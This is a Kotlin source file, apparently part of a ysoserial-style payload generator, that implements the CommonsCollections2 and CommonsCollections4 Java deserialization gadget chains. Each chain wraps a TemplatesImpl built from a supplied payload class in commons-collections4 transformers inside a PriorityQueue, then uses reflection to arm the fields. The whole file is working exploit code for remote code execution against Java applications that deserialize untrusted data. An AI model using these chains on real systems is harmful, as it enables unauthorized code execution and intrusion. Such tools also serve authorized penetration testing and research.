package com.xhstormr.app

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
import org.apache.commons.collections4.Transformer
import org.apache.commons.collections4.comparators.TransformingComparator
import org.apache.commons.collections4.functors.ChainedTransformer
import org.apache.commons.collections4.functors.ConstantTransformer
import org.apache.commons.collections4.functors.InstantiateTransformer
import org.apache.commons.collections4.functors.InvokerTransformer
import java.util.PriorityQueue
import javax.xml.transform.Templates

enum class Chain {

    CommonsCollections2Chain {
        override fun generate(payload: Class<*>): Any {
            val templates = Gadgets.createTemplatesImpl(payload)
            // mock method name until armed
            val transformer = InvokerTransformer<Any, Any>(
                "toString",
                arrayOfNulls(0),
                arrayOfNulls(0)
            )

            // create queue with numbers and basic comparator
            val queue = PriorityQueue(2, TransformingComparator(transformer))
            // stub data for replacement later
            queue.add(1)
            queue.add(1)

            // switch method called by comparator
            transformer.setFieldValue("iMethodName", "newTransformer")

            // switch contents of queue
            val queueArray = queue.getFieldValue("queue") as Array<Any>
            queueArray[0] = templates
            queueArray[1] = 1
            return queue
        }
    },

    CommonsCollections4Chain {
        override fun generate(payload: Class<*>): Any {
            val templates = Gadgets.createTemplatesImpl(payload)
            val constant = ConstantTransformer<Any, Any>(clazz<String>())

            // mock method name until armed
            var paramTypes: Array<Class<*>> = arrayOf(clazz<String>())
            var args: Array<Any> = arrayOf("foo")
            val instantiate = InstantiateTransformer<Any>(paramTypes, args)

            // grab defensively copied arrays
            paramTypes = instantiate.getFieldValue("iParamTypes") as Array<Class<*>>
            args = instantiate.getFieldValue("iArgs") as Array<Any>
            val chain = ChainedTransformer<Any>(constant as Transformer<Any, Any>, instantiate as Transformer<Any, Any>)

            // create queue with numbers
            val queue = PriorityQueue(2, TransformingComparator(chain))
            queue.add(1)
            queue.add(1)

            constant.setFieldValue("iConstant", clazz<TrAXFilter>())
            paramTypes[0] = clazz<Templates>()
            args[0] = templates
            return queue
        }
    };

    abstract fun generate(payload: Class<*>): Any
}
